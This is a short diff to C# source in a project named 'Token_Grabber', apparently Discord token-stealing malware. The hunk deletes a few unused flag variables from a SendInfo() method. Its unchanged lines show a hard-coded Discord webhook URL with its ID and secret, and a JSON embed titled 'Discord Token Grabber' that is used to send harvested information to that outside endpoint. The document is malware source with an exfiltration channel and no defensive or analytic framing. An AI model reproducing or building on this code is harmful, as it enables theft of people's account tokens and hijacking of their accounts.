@@ -19,10 +19,6 @@ namespace Token_Grabber
 
         static void SendInfo()
         {
-            bool isAscii;
-            bool FirstTokenFailed = false;
-            bool SecondTokenFailed = false;
-
             //Discord webhook url
             string url = "https://discord.com/api/webhooks/959071811419652096/dOkV-5nK6JXpqa-86ODdZfbkAaV9UhJ9fzlLf3Ta-35SmGYjkY_XZCxGsYdAfbERDZUT";
             string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \" \\n \\n \\n \\n\\n\", \"title\":\"Info:\", \"color\":1018364}] }";
